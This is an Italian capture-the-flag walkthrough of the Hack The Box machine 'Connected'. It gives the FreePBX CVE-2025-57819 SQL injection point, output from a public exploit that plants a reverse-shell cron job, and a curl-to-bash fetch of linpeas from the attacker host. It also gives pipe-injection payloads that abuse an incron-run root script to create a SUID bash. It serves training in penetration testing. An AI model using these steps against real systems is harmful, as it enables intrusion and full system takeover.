# Connected

IP vittima: 10.129.13.170 
IP attaccante: 10.10.14.241
## Recon
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.13.170 -oG porte`
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-10 19:07 CEST
Initiating SYN Stealth Scan at 19:07
Scanning 10.129.13.170 [65535 ports]
Discovered open port 443/tcp on 10.129.13.170
Discovered open port 22/tcp on 10.129.13.170
Discovered open port 80/tcp on 10.129.13.170
Completed SYN Stealth Scan at 19:07, 26.38s elapsed (65535 total ports)
Nmap scan report for 10.129.13.170
Host is up, received user-set (0.022s latency).
Scanned at 2026-06-10 19:07:12 CEST for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 23 (1.012KB)
```
Scoperte le porte 22, 80, 443
`sudo nmap -sC -sV -p22,80,443 10.129.13.170 -oN servizi`
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-10 19:10 CEST
Nmap scan report for 10.129.13.170
Host is up (0.021s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
| http-robots.txt: 1 disallowed entry 
|_/
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-title: 404 Not Found
|_Requested resource was config.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.77 seconds
```
### Porta 22 - SSH
- La porta **22** è aperta.
- È in esecuzione **OpenSSH 7.4**.
- Supporta il protocollo SSH v2.
### Porta 80 - HTTP
#### Web server
Il server web è:
```
Apache/2.4.6 (CentOS)
OpenSSL/1.0.2k-fips
PHP/7.4.16
```
Redirect interessante
```
http-title: Did not follow redirect to http://connected.htb/
```
Quando Nmap visita:
```
http://10.129.13.170
```
il server risponde con un redirect verso:
```
http://connected.htb
```
Quindi aggiungere a `/etc/hosts`:
```
10.129.13.170 connected.htb
```
#### Porta 443 - HTTPS
```
443/tcp open ssl/http
```
È presente anche HTTPS.
##### Certificato SSL
```
Subject: commonName=pbxconnect
```
Questo è un indizio molto interessante.
"PBX" spesso indica:
- centralino VoIP
- Asterisk
- FreePBX
- Issabel
- sistemi telefonici aziendali
Quindi il target potrebbe ospitare un'applicazione di telefonia IP.
#### robots.txt
```
http-robots.txt: 1 disallowed entry/
```
Significa che esiste:
```
https://connected.htb/robots.txt
```
e contiene qualcosa come:
```
User-agent: *Disallow: /
```
Quindi i crawler sono invitati a non indicizzare il sito.
## freePBX - CVE-2025-57819
Sulle porte 80 e 443 è presente un'istanza di **FreePBX** in versione **16.0.40.7**
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610193423.png)
Si può trovare anche con il comando:
`curl -s -L http://connected.htb/ | head -n 40`
``` html
<!DOCTYPE html><html class="firsttypeofselector"><head><title>FreePBX Administration</title><meta http-equiv="Content-Type" content="text/html;charset=utf-8"><meta name="robots" content="noindex" /><link rel="shortcut icon" href="images/favicon.ico"><meta name="referrer" content="always"><link href="assets/css/bootstrap-3.3.7.min.css?load_version=16.0.40.7"
...
```
Questa versione (**FreePBX 16.0.40.7**) è vulnerabile a **CVE-2025-57819**, una **SQL injection non autenticata nel modulo Endpoint Manager** che si concatena fino a RCE.
Concettualmente la catena è:

```
Input non sanitizzato
        ↓
Bypass autenticazione
        ↓
Accesso all'interfaccia Admin
        ↓
Manipolazione database
        ↓
Remote Code Execution (RCE)
```
Un attaccante remoto può sfruttare endpoint vulnerabili senza possedere credenziali valide e ottenere accesso amministrativo al sistema, arrivando infine all'esecuzione di codice sul server.

Normalmente un PBX segue questo schema:
```
Internet
   ↓
Login
   ↓
Pannello Admin
   ↓
Configurazione Asterisk
```
Con CVE-2025-57819 il passaggio "Login" può essere aggirato.
In pratica:
```
Internet
   ↓
Richiesta malevola
   ↓
Admin FreePBX
   ↓
Codice sul server
```
L'attaccante non deve:
- conoscere username;
- conoscere password;
- convincere un utente a cliccare qualcosa.
È una vulnerabilità **pre-authentication** ("prima dell'autenticazione").
Più nel dettaglio l'ajax handler del modulo `endpoint` concatena il parametro `brand` direttamente dentro una query SQL, senza sanitizzazione. In più, il path `FreePBX\modules\endpoint\ajax` bypassa il controllo di autenticazione/Referrer dell'ajax. Risultato: SQL injection **non autenticata**, error-based, con anche **stacked query** abilitate (cioè puoi scrivere, non solo leggere). Il punto di iniezione è:
```
/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=<INJECTION>
```
La catena verso RCE: si inietta un record SQL nella tabella `cron_jobs`, che contiene i task cron che FreePBX esegue nel contesto del sistema operativo. In pratica scriviamo un cron job malevolo via SQLi, e quando FreePBX lo esegue otteniamo code execution.

Per sfruttare la vulnerabilità usiamo questo POC:
https://github.com/b4sh2/CVE-2025-57819-poc
Dopo aver scaricato la repository attiviamo un ambiente python venv e installiamo le dipendenze:
```
python3 -m venv venv
source venv/bin/activate
pip install requests urllib3
```
Poi lanciamo l'exploit:
```
python3 exploit.py https://connected.htb
```
Otteniamo una shell con l'utente **asterisk**
```
[*] Listener address: 10.10.14.241:4444 (iface tun0)
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 5.5.65-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jqcatsnq' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.13.170:57522 !
[+] Removed cron job 'jqcatsnq' (no repeat callbacks).
--- interactive shell (Ctrl-C to quit) ---
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:6F:E2:CF | 10.129.13.170             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+
...
[asterisk@connected ~]$
```
## Scalata dei privilegi
Lanciamo [[linpeas]]:
``` bash
# Sulla nostra macchina nella cartella che contiene linpeas.sh 
python3 -m http.server 8000
# Sulla macchina vittima
curl -s http://10.10.14.241:8000/linpeas.sh | bash | tee /tmp/linpeas.txt
# Salviamo l'output di linpeas nel file /tmp/linpeas.txt
```
Linpeas trova:
`╔══════════╣ Check for vulnerable cron jobs`
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610211236.png)
e
![](https://github.com/Xerand/Macchine-Hack-the-Box/blob/main/images/Pasted%20image%2020260610212844.png)
Queste righe erano praticamente il cuore della privilege escalation:
```
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
...
incrond.service loaded active running Inotify System Scheduler
```
Con il comando:
`ps auxww | grep -Ei "incron"`
appuriamo che **incrond** gira con privilegi **root**. 

Tutto ciò significa che:
- incrond è attivo
- incrond gira come servizio di sistema
- monitora /var/spool/asterisk/incron
- quando un file viene creato/modificato in /var/spool/asterisk/incron, esegui /usr/bin/sysadmin_manager passando come argomento il nome del file.

Incrond è simile a **cron**, ma invece di eseguire comandi a orari prestabiliti, li esegue quando avvengono eventi sul filesystem, ad esempio quando un file viene creato o modificato.
Dato che incrond gira come root, anche **/usr/bin/sysadmin_manager** viene eseguito come **root**.

Verifica dei permessi della directory monitorata:
``` bash
ls -ld /var/spool/asterisk/incron
# drwxrwxr-x. 2 asterisk asterisk 6 Nov 30  2025 /var/spool/asterisk/incron
```
La directory `/var/spool/asterisk/incron` è scrivibile dall'utente **asterisk**.
Questa è la condizione fondamentale: asterisk può scrivere in una directory monitorata da incrond, e incrond esegue un comando come root quando quella directory cambia.

Occorre analizzare **/usr/bin/sysadmin_manager** per capire come funziona.
``` bash
ls -l /usr/bin/sysadmin_manager 
file /usr/bin/sysadmin_manager
# -rwxr-xr-x. 1 root root 6403 Apr 15 2021 /usr/bin/sysadmin_manager
# /usr/bin/sysadmin_manager: PHP script, ASCII text executable
```
Essendo uno script PHP leggibile, lo analizziamo:
```
cat **/usr/bin/sysadmin_manager**
```
La parte iniziale gestisce l'argomento passato da `incrond`:
```php
if ($argv[1] == "--local") {
    $request = $argv[2];
    $filename = "/usr/local/asterisk/incron/$request";
} else {
    $request = $argv[1];
    $filename = "/var/spool/asterisk/incron/$request";
}
```
Il nome del file viene poi validato con questo formato:
```php
if (!preg_match('/^(\w+)_([\w-]+)$/', $request, $parts)) {
    if (!preg_match('/^([\w_]+)\.([\w-]+)(?:\.(.+))?$/', $request, $parts)) {
        syslog(LOG_ERR, "Invalid hook format");
        exit;
    }
}
```
Quindi il file può avere una struttura di questo tipo:
```text
modulo.hook.parametri
```
Per esempio:
```text
sysadmin.restart-apache.qualcosa
```
Lo script estrae:
```text
module = sysadmin
hook   = restart-apache
params = qualcosa
```
Nel codice era presente una funzionalità importante:
```php
if (isset($parts[3])) {
    if ($parts[3] === "CONTENTS") {
        $params = fread($fh, 4096);
    } else {
        $params = $parts[3];
    }
} else {
    $params = "";
}
```
Se il nome del file termina con `.CONTENTS`, i parametri non vengono presi dal nome del file, ma dal contenuto del file stesso.
Quindi un file chiamato:
```text
sysadmin.restart-apache.CONTENTS
```
fa sì che `sysadmin_manager` legga il contenuto del file e lo usi come parametro dell'hook.
Questa funzionalità è essenziale, perché ci permette di inserire comandi contenenti `/`, come `/bin/bash` e `/tmp/rootbash`, che non possono essere messi direttamente nel nome del file.
Alla fine dello script `sysadmin_manager` veniva eseguito l'hook così:
```php
system("$hookfile $params");
```
Prima dell'esecuzione, lo script filtra alcuni caratteri pericolosi:
```php
if (preg_match('/[`\'"$><&;]/', $params)) {
    syslog(LOG_ERR, "Detected invalid char in params. You must use base64 to pass unusual chars to a hook.");
    exit;
}
```
Il filtro blocca:
```text
` ' " $ > < & ;
```
ma non blocca il carattere pipe:
```text
|
```
Questo è il punto vulnerabile. Dato che il comando viene eseguito tramite `system()`, si può usare `|` per concatenare un secondo comando.
Esempio concettuale:
```bash
hook_legittimo | comando_arbitrario
```
Poiché `sysadmin_manager` veniva lanciato da `incrond` come `root`, anche il comando dopo la pipe veniva eseguito come `root`.
Serve un hook valido, firmato ed eseguibile.
Abbiamo elencato gli hook disponibili:
```bash
find /var/www/html/admin/modules -path "*/hooks/*" -type f -executable -ls 2>/dev/null
```
Tra gli hook presenti abbiamo scelto:
```text
/var/www/html/admin/modules/sysadmin/hooks/restart-apache
```
Lo abbiamo controllato:
```bash
cat /var/www/html/admin/modules/sysadmin/hooks/restart-apache
```
Contenuto:
```bash
#!/bin/bash

# Can we ask httpd to restart?

# We do this because systemd insists on doing a
# graceful shutdown, when that's the exact opposite of what
# we want.  So if we can ask httpd ourselves, we avoid
# systemd.  Sigh.
if [ -f "/var/spool/asterisk/tmp/GuiUpdate.flag" ]; then
    exit
fi

if [ -x /usr/sbin/httpd ]; then
    /usr/sbin/httpd -k restart
else
    service httpd restart
fi
```
Questo hook è adatto perché:
- è un hook legittimo;
- è eseguibile;
- appartiene al modulo `sysadmin`;
- è accettato da `sysadmin_manager`;
- non richiede parametri complessi;
- viene eseguito da `root` tramite `incrond`.
### Passaggi della scalata dei privilegi

#### Step 1 — Copia di `/bin/bash` in `/tmp/rootbash`

Abbiamo scritto nel file trigger il payload con la pipe:
```bash
printf '%s' '|cp /bin/bash /tmp/rootbash' > /var/spool/asterisk/incron/sysadmin.restart-apache.CONTENTS
```

Cosa succede:
1. viene scritto il file `/var/spool/asterisk/incron/sysadmin.restart-apache.CONTENTS`;
2. `incrond` rileva l'evento `IN_CLOSE_WRITE`;
3. `incrond`, come `root`, esegue:
```bash
/usr/bin/sysadmin_manager sysadmin.restart-apache.CONTENTS
```
4. `sysadmin_manager` interpreta:
```text
module = sysadmin
hook   = restart-apache
params = contenuto del file
```
5. il contenuto del file è:
```text
|cp /bin/bash /tmp/rootbash
```
6. il comando finale diventa concettualmente:
```bash
/var/www/html/admin/modules/sysadmin/hooks/restart-apache | cp /bin/bash /tmp/rootbash
```
7. il comando `cp /bin/bash /tmp/rootbash` viene eseguito come `root`.
Verifica:
``` bash
ls -l /tmp/rootbash
# -rwxr-xr-x 1 root root 964536 Jun 10 20:40 /tmp/rootbash
```
A questo punto `/tmp/rootbash` esisteva ed era di proprietà di `root`.

#### Step 2 — Impostazione del bit SUID

Abbiamo poi impostato il bit SUID su `/tmp/rootbash`:
```bash
printf '%s' '|chmod 4755 /tmp/rootbash' > /var/spool/asterisk/incron/sysadmin.restart-apache.CONTENTS
```

Anche questo comando veniva eseguito come `root` tramite la stessa catena:
```text
incrond → sysadmin_manager → restart-apache → pipe → chmod
```
Verifica:
```bash
ls -l /tmp/rootbash
# -rwsr-xr-x 1 root root 964536 Jun 10 20:40 /tmp/rootbash
```
La `s` nei permessi indica che il bit SUID è attivo.
#### Step 3 — Ottenimento della shell root

Infine abbiamo eseguito la bash SUID con l'opzione `-p`:
```bash
/tmp/rootbash -p
```
L'opzione `-p` è importante perché permette a Bash di preservare l'effective UID.

Verifica:
``` bash
whoami
# root
```
Siamo **root**
Nella cartella `/root` troviamo la root flag.
